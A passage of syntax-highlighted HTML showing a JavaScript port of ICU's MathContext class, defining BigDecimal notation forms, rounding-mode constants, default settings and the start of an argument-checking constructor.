&lt;code&gt;BigDecimal&lt;/code&gt; operation.</span></span><br><span class="line"><span class="comment">  * A zero result in plain form may have a decimal part of one or</span></span><br><span class="line"><span class="comment">  * more zeros.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @see #ENGINEERING</span></span><br><span class="line"><span class="comment">  * @see #PLAIN</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int SCIENTIFIC=1; // 1 digit before .</span></span><br><span class="line"> MathContext.SCIENTIFIC = MathContext.prototype.SCIENTIFIC = <span class="number">1</span>; <span class="comment">// 1 digit before .</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Standard floating point notation (with engineering exponential</span></span><br><span class="line"><span class="comment">  * format, where the power of ten is a multiple of 3).</span></span><br><span class="line"><span class="comment">  * Used as a setting to control the form of the result of a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; operation.</span></span><br><span class="line"><span class="comment">  * A zero result in plain form may have a decimal part of one or</span></span><br><span class="line"><span class="comment">  * more zeros.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @see #PLAIN</span></span><br><span class="line"><span class="comment">  * @see #SCIENTIFIC</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ENGINEERING=2; // 1-3 digits before .</span></span><br><span class="line"> MathContext.ENGINEERING = MathContext.prototype.ENGINEERING = <span class="number">2</span>; <span class="comment">// 1-3 digits before .</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// The rounding modes match the original BigDecimal class values</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round to a more positive number.</span></span><br><span class="line"><span class="comment">  * Used as a setting to control the rounding mode used during a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; operation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If any of the discarded digits are non-zero then the result</span></span><br><span class="line"><span class="comment">  * should be rounded towards the next more positive digit.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_CEILING=2;</span></span><br><span class="line"> MathContext.ROUND_CEILING = MathContext.prototype.ROUND_CEILING = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round towards zero.</span></span><br><span class="line"><span class="comment">  * Used as a setting to control the rounding mode used during a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; operation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * All discarded digits are ignored (truncated).  The result is</span></span><br><span class="line"><span class="comment">  * neither incremented nor decremented.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_DOWN=1;</span></span><br><span class="line"> MathContext.ROUND_DOWN = MathContext.prototype.ROUND_DOWN = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round to a more negative number.</span></span><br><span class="line"><span class="comment">  * Used as a setting to control the rounding mode used during a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; operation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If any of the discarded digits are non-zero then the result</span></span><br><span class="line"><span class="comment">  * should be rounded towards the next more negative digit.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_FLOOR=3;</span></span><br><span class="line"> MathContext.ROUND_FLOOR = MathContext.prototype.ROUND_FLOOR = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round to nearest neighbor, where an equidistant</span></span><br><span class="line"><span class="comment">  * value is rounded down.</span></span><br><span class="line"><span class="comment">  * Used as a setting to control the rounding mode used during a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; operation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If the discarded digits represent greater than half (0.5 times)</span></span><br><span class="line"><span class="comment">  * the value of a one in the next position then the result should be</span></span><br><span class="line"><span class="comment">  * rounded up (away from zero).  Otherwise the discarded digits are</span></span><br><span class="line"><span class="comment">  * ignored.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_HALF_DOWN=5;</span></span><br><span class="line"> MathContext.ROUND_HALF_DOWN = MathContext.prototype.ROUND_HALF_DOWN = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round to nearest neighbor, where an equidistant</span></span><br><span class="line"><span class="comment">  * value is rounded to the nearest even neighbor.</span></span><br><span class="line"><span class="comment">  * Used as a setting to control the rounding mode used during a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; operation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If the discarded digits represent greater than half (0.5 times)</span></span><br><span class="line"><span class="comment">  * the value of a one in the next position then the result should be</span></span><br><span class="line"><span class="comment">  * rounded up (away from zero).  If they represent less than half,</span></span><br><span class="line"><span class="comment">  * then the result should be rounded down.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Otherwise (they represent exactly half) the result is rounded</span></span><br><span class="line"><span class="comment">  * down if its rightmost digit is even, or rounded up if its</span></span><br><span class="line"><span class="comment">  * rightmost digit is odd (to make an even digit).</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_HALF_EVEN=6;</span></span><br><span class="line"> MathContext.ROUND_HALF_EVEN = MathContext.prototype.ROUND_HALF_EVEN = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round to nearest neighbor, where an equidistant</span></span><br><span class="line"><span class="comment">  * value is rounded up.</span></span><br><span class="line"><span class="comment">  * Used as a setting to control the rounding mode used during a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; operation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If the discarded digits represent greater than or equal to half</span></span><br><span class="line"><span class="comment">  * (0.5 times) the value of a one in the next position then the result</span></span><br><span class="line"><span class="comment">  * should be rounded up (away from zero).  Otherwise the discarded</span></span><br><span class="line"><span class="comment">  * digits are ignored.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_HALF_UP=4;</span></span><br><span class="line"> MathContext.ROUND_HALF_UP = MathContext.prototype.ROUND_HALF_UP = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to assert that no rounding is necessary.</span></span><br><span class="line"><span class="comment">  * Used as a setting to control the rounding mode used during a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; operation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Rounding (potential loss of information) is not permitted.</span></span><br><span class="line"><span class="comment">  * If any of the discarded digits are non-zero then an</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;ArithmeticException&lt;/code&gt; should be thrown.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_UNNECESSARY=7;</span></span><br><span class="line"> MathContext.ROUND_UNNECESSARY = MathContext.prototype.ROUND_UNNECESSARY = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round away from zero.</span></span><br><span class="line"><span class="comment">  * Used as a setting to control the rounding mode used during a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; operation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If any of the discarded digits are non-zero then the result will</span></span><br><span class="line"><span class="comment">  * be rounded up (away from zero).</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_UP=0;</span></span><br><span class="line"> MathContext.ROUND_UP = MathContext.prototype.ROUND_UP = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* properties shared */</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * The number of digits (precision) to be used for an operation.</span></span><br><span class="line"><span class="comment">  * A value of 0 indicates that unlimited precision (as many digits</span></span><br><span class="line"><span class="comment">  * as are required) will be used.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The &#123;@link BigDecimal&#125; operator methods use this value to</span></span><br><span class="line"><span class="comment">  * determine the precision of results.</span></span><br><span class="line"><span class="comment">  * Note that leading zeros (in the integer part of a number) are</span></span><br><span class="line"><span class="comment">  * never significant.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;digits&lt;/code&gt; will always be non-negative.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @serial</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--int digits;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * The form of results from an operation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The &#123;@link BigDecimal&#125; operator methods use this value to</span></span><br><span class="line"><span class="comment">  * determine the form of results, in particular whether and how</span></span><br><span class="line"><span class="comment">  * exponential notation should be used.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @see #ENGINEERING</span></span><br><span class="line"><span class="comment">  * @see #PLAIN</span></span><br><span class="line"><span class="comment">  * @see #SCIENTIFIC</span></span><br><span class="line"><span class="comment">  * @serial</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--int form; // values for this must fit in a byte</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Controls whether lost digits checking is enabled for an</span></span><br><span class="line"><span class="comment">  * operation.</span></span><br><span class="line"><span class="comment">  * Set to &lt;code&gt;true&lt;/code&gt; to enable checking, or</span></span><br><span class="line"><span class="comment">  * to &lt;code&gt;false&lt;/code&gt; to disable checking.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * When enabled, the &#123;@link BigDecimal&#125; operator methods check</span></span><br><span class="line"><span class="comment">  * the precision of their operand or operands, and throw an</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;ArithmeticException&lt;/code&gt; if an operand is more precise</span></span><br><span class="line"><span class="comment">  * than the digits setting (that is, digits would be lost).</span></span><br><span class="line"><span class="comment">  * When disabled, operands are rounded to the specified digits.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @serial</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--boolean lostDigits;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * The rounding algorithm to be used for an operation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The &#123;@link BigDecimal&#125; operator methods use this value to</span></span><br><span class="line"><span class="comment">  * determine the algorithm to be used when non-zero digits have to</span></span><br><span class="line"><span class="comment">  * be discarded in order to reduce the precision of a result.</span></span><br><span class="line"><span class="comment">  * The value must be one of the public constants whose name starts</span></span><br><span class="line"><span class="comment">  * with &lt;code&gt;ROUND_&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @see #ROUND_CEILING</span></span><br><span class="line"><span class="comment">  * @see #ROUND_DOWN</span></span><br><span class="line"><span class="comment">  * @see #ROUND_FLOOR</span></span><br><span class="line"><span class="comment">  * @see #ROUND_HALF_DOWN</span></span><br><span class="line"><span class="comment">  * @see #ROUND_HALF_EVEN</span></span><br><span class="line"><span class="comment">  * @see #ROUND_HALF_UP</span></span><br><span class="line"><span class="comment">  * @see #ROUND_UNNECESSARY</span></span><br><span class="line"><span class="comment">  * @see #ROUND_UP</span></span><br><span class="line"><span class="comment">  * @serial</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--int roundingMode;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* properties private constant */</span></span><br><span class="line"> <span class="comment">// default settings</span></span><br><span class="line"> <span class="comment">//--private static final int DEFAULT_FORM=SCIENTIFIC;</span></span><br><span class="line"> <span class="comment">//--private static final int DEFAULT_DIGITS=9;</span></span><br><span class="line"> <span class="comment">//--private static final boolean DEFAULT_LOSTDIGITS=false;</span></span><br><span class="line"> <span class="comment">//--private static final int DEFAULT_ROUNDINGMODE=ROUND_HALF_UP;</span></span><br><span class="line"> MathContext.prototype.DEFAULT_FORM=MathContext.prototype.SCIENTIFIC;</span><br><span class="line"> MathContext.prototype.DEFAULT_DIGITS=<span class="number">9</span>;</span><br><span class="line"> MathContext.prototype.DEFAULT_LOSTDIGITS=<span class="literal">false</span>;</span><br><span class="line"> MathContext.prototype.DEFAULT_ROUNDINGMODE=MathContext.prototype.ROUND_HALF_UP;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* properties private constant */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private static final int MIN_DIGITS=0; // smallest value for DIGITS.</span></span><br><span class="line"> <span class="comment">//--private static final int MAX_DIGITS=999999999; // largest value for DIGITS.  If increased,</span></span><br><span class="line"> MathContext.prototype.MIN_DIGITS=<span class="number">0</span>; <span class="comment">// smallest value for DIGITS.</span></span><br><span class="line"> MathContext.prototype.MAX_DIGITS=<span class="number">999999999</span>; <span class="comment">// largest value for DIGITS.  If increased,</span></span><br><span class="line"> <span class="comment">// the BigDecimal class may need update.</span></span><br><span class="line"> <span class="comment">// list of valid rounding mode values, most common two first</span></span><br><span class="line"> <span class="comment">//--private static final int ROUNDS[]=new int[]&#123;ROUND_HALF_UP,ROUND_UNNECESSARY,ROUND_CEILING,ROUND_DOWN,ROUND_FLOOR,ROUND_HALF_DOWN,ROUND_HALF_EVEN,ROUND_UP&#125;;</span></span><br><span class="line"> MathContext.prototype.ROUNDS=<span class="keyword">new</span> <span class="built_in">Array</span>(MathContext.prototype.ROUND_HALF_UP,MathContext.prototype.ROUND_UNNECESSARY,MathContext.prototype.ROUND_CEILING,MathContext.prototype.ROUND_DOWN,MathContext.prototype.ROUND_FLOOR,MathContext.prototype.ROUND_HALF_DOWN,MathContext.prototype.ROUND_HALF_EVEN,MathContext.prototype.ROUND_UP);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private static final java.lang.String ROUNDWORDS[]=new java.lang.String[]&#123;"ROUND_HALF_UP","ROUND_UNNECESSARY","ROUND_CEILING","ROUND_DOWN","ROUND_FLOOR","ROUND_HALF_DOWN","ROUND_HALF_EVEN","ROUND_UP"&#125;; // matching names of the ROUNDS values</span></span><br><span class="line"> MathContext.prototype.ROUNDWORDS=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"ROUND_HALF_UP"</span>,<span class="string">"ROUND_UNNECESSARY"</span>,<span class="string">"ROUND_CEILING"</span>,<span class="string">"ROUND_DOWN"</span>,<span class="string">"ROUND_FLOOR"</span>,<span class="string">"ROUND_HALF_DOWN"</span>,<span class="string">"ROUND_HALF_EVEN"</span>,<span class="string">"ROUND_UP"</span>); <span class="comment">// matching names of the ROUNDS values</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* properties private constant unused */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// Serialization version</span></span><br><span class="line"> <span class="comment">//--private static final long serialVersionUID=7163376998892515376L;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* properties public constant */</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * A &lt;code&gt;MathContext&lt;/code&gt; object initialized to the default</span></span><br><span class="line"><span class="comment">  * settings for general-purpose arithmetic.  That is,</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;digits=9 form=SCIENTIFIC lostDigits=false</span></span><br><span class="line"><span class="comment">  * roundingMode=ROUND_HALF_UP&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @see #SCIENTIFIC</span></span><br><span class="line"><span class="comment">  * @see #ROUND_HALF_UP</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final com.ibm.icu.math.MathContext DEFAULT=new com.ibm.icu.math.MathContext(DEFAULT_DIGITS,DEFAULT_FORM,DEFAULT_LOSTDIGITS,DEFAULT_ROUNDINGMODE);</span></span><br><span class="line"> MathContext.prototype.DEFAULT=<span class="keyword">new</span> MathContext(MathContext.prototype.DEFAULT_DIGITS,MathContext.prototype.DEFAULT_FORM,MathContext.prototype.DEFAULT_LOSTDIGITS,MathContext.prototype.DEFAULT_ROUNDINGMODE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* ----- Constructors ----- */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a new &lt;code&gt;MathContext&lt;/code&gt; with a specified</span></span><br><span class="line"><span class="comment">  * precision.</span></span><br><span class="line"><span class="comment">  * The other settings are set to the default values</span></span><br><span class="line"><span class="comment">  * (see &#123;@link #DEFAULT&#125;).</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * An &lt;code&gt;IllegalArgumentException&lt;/code&gt; is thrown if the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;setdigits&lt;/code&gt; parameter is out of range</span></span><br><span class="line"><span class="comment">  * (&lt;0 or &gt;999999999).</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param setdigits     The &lt;code&gt;int&lt;/code&gt; digits setting</span></span><br><span class="line"><span class="comment">  *                      for this &lt;code&gt;MathContext&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws IllegalArgumentException parameter out of range.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public MathContext(int setdigits)&#123;</span></span><br><span class="line"> <span class="comment">//-- this(setdigits,DEFAULT_FORM,DEFAULT_LOSTDIGITS,DEFAULT_ROUNDINGMODE);</span></span><br><span class="line"> <span class="comment">//-- return;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a new &lt;code&gt;MathContext&lt;/code&gt; with a specified</span></span><br><span class="line"><span class="comment">  * precision and form.</span></span><br><span class="line"><span class="comment">  * The other settings are set to the default values</span></span><br><span class="line"><span class="comment">  * (see &#123;@link #DEFAULT&#125;).</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * An &lt;code&gt;IllegalArgumentException&lt;/code&gt; is thrown if the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;setdigits&lt;/code&gt; parameter is out of range</span></span><br><span class="line"><span class="comment">  * (&lt;0 or &gt;999999999), or if the value given for the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;setform&lt;/code&gt; parameter is not one of the appropriate</span></span><br><span class="line"><span class="comment">  * constants.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param setdigits     The &lt;code&gt;int&lt;/code&gt; digits setting</span></span><br><span class="line"><span class="comment">  *                      for this &lt;code&gt;MathContext&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @param setform       The &lt;code&gt;int&lt;/code&gt; form setting</span></span><br><span class="line"><span class="comment">  *                      for this &lt;code&gt;MathContext&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws IllegalArgumentException parameter out of range.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public MathContext(int setdigits,int setform)&#123;</span></span><br><span class="line"> <span class="comment">//-- this(setdigits,setform,DEFAULT_LOSTDIGITS,DEFAULT_ROUNDINGMODE);</span></span><br><span class="line"> <span class="comment">//-- return;&#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a new &lt;code&gt;MathContext&lt;/code&gt; with a specified</span></span><br><span class="line"><span class="comment">  * precision, form, and lostDigits setting.</span></span><br><span class="line"><span class="comment">  * The roundingMode setting is set to its default value</span></span><br><span class="line"><span class="comment">  * (see &#123;@link #DEFAULT&#125;).</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * An &lt;code&gt;IllegalArgumentException&lt;/code&gt; is thrown if the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;setdigits&lt;/code&gt; parameter is out of range</span></span><br><span class="line"><span class="comment">  * (&lt;0 or &gt;999999999), or if the value given for the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;setform&lt;/code&gt; parameter is not one of the appropriate</span></span><br><span class="line"><span class="comment">  * constants.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param setdigits     The &lt;code&gt;int&lt;/code&gt; digits setting</span></span><br><span class="line"><span class="comment">  *                      for this &lt;code&gt;MathContext&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @param setform       The &lt;code&gt;int&lt;/code&gt; form setting</span></span><br><span class="line"><span class="comment">  *                      for this &lt;code&gt;MathContext&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @param setlostdigits The &lt;code&gt;boolean&lt;/code&gt; lostDigits</span></span><br><span class="line"><span class="comment">  *                      setting for this &lt;code&gt;MathContext&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws IllegalArgumentException parameter out of range.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public MathContext(int setdigits,int setform,boolean setlostdigits)&#123;</span></span><br><span class="line"> <span class="comment">//-- this(setdigits,setform,setlostdigits,DEFAULT_ROUNDINGMODE);</span></span><br><span class="line"> <span class="comment">//-- return;&#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a new &lt;code&gt;MathContext&lt;/code&gt; with a specified</span></span><br><span class="line"><span class="comment">  * precision, form, lostDigits, and roundingMode setting.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * An &lt;code&gt;IllegalArgumentException&lt;/code&gt; is thrown if the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;setdigits&lt;/code&gt; parameter is out of range</span></span><br><span class="line"><span class="comment">  * (&lt;0 or &gt;999999999), or if the value given for the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;setform&lt;/code&gt; or &lt;code&gt;setroundingmode&lt;/code&gt; parameters is</span></span><br><span class="line"><span class="comment">  * not one of the appropriate constants.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param setdigits       The &lt;code&gt;int&lt;/code&gt; digits setting</span></span><br><span class="line"><span class="comment">  *                        for this &lt;code&gt;MathContext&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @param setform         The &lt;code&gt;int&lt;/code&gt; form setting</span></span><br><span class="line"><span class="comment">  *                        for this &lt;code&gt;MathContext&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @param setlostdigits   The &lt;code&gt;boolean&lt;/code&gt; lostDigits</span></span><br><span class="line"><span class="comment">  *                        setting for this &lt;code&gt;MathContext&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @param setroundingmode The &lt;code&gt;int&lt;/code&gt; roundingMode setting</span></span><br><span class="line"><span class="comment">  *                        for this &lt;code&gt;MathContext&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws IllegalArgumentException parameter out of range.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public MathContext(int setdigits,int setform,boolean setlostdigits,int setroundingmode)&#123;super();</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">MathContext</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//-- members</span></span><br><span class="line">  <span class="keyword">this</span>.digits = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>.form = <span class="number">0</span>; <span class="comment">// values for this must fit in a byte</span></span><br><span class="line">  <span class="keyword">this</span>.lostDigits = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">this</span>.roundingMode = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//-- overloaded ctor</span></span><br><span class="line">  <span class="keyword">var</span> setform = <span class="keyword">this</span>.DEFAULT_FORM;</span><br><span class="line">  <span class="keyword">var</span> setlostdigits = <span class="keyword">this</span>.DEFAULT_LOSTDIGITS;</span><br><span class="line">  <span class="keyword">var</span> setroundingmode = <span class="keyword">this</span>.DEFAULT_ROUNDINGMODE;</span><br><span class="line">  <span class="keyword">if</span> (MathContext.arguments.length == <span class="number">4</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    setform = MathContext.arguments[<span class="number">1</span>];</span><br><span class="line">    setlostdigits = MathContext.arguments[<span class="number">2</span>];</span><br><span class="line">    setroundingmode = MathContext.arguments[<span class="number">3</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (MathContext.arguments.length == <span class="number">3</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    setform = MathContext.arguments[<span class="number">1</span>];</span><br><span class="line">    setlostdigits = MathContext.arguments[<span class="number">2</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (MathContext.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    setform = MathContext.arguments[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (MathContext.arguments.length != <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"MathContext(): "</span> + MathContext.arguments.length + <span class="string">" arguments given; expected 1 to 4"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> setdigits = MathContext.arguments[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// set values, after checking</span></span><br><span class="line">  <span class="keyword">if</span> (setdigits!=<span class="keyword">this</span>.DEFAULT_DIGITS)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">if</span> (setdigits&lt;<span class="keyword">this</span>.MIN_DIGITS)</span><br><span class="line">     <span class="keyword">throw</span> <span class="string">"MathContext(): Digits too small: "</span>+setdigits;</span><br><span class="line">    <span class="keyword">if</span> (setdigits&gt;<span class="keyword">this</span>.MAX_DIGITS)</span><br><span class="line">     <span class="keyword">throw</span> <span class="string">"MathContext(): Digits too large: "</span>+setdigits;</span><br><span class="line">   &#125;</span><br><span class="line">  &#123;<span class="comment">/*select*/</span></span><br><span class="line">  <span class="keyword">if</span> (setform==<span class="keyword">this</span>.SCIENTIFIC)</span><br><span class="line">   &#123;&#125; <span class="comment">// [most common]</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (setform==<span class="keyword">this</span>.ENGINEERING)</span><br><span class="line">   &#123;&#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (setform==<span class="keyword">this</span>.PLAIN)</span><br><span class="line">   &#123;&#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">throw</span> <span class="string">"MathContext() Bad form value: "</span>+setform;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((!(<span class="keyword">this</span>.isValidRound(setroundingmode))))</span><br><span class="line">   <span class="keyword">throw</span> <span class="string">"MathContext(): Bad roundingMode value: "</span>+setroundingmode;</span><br><span class="line">  <span 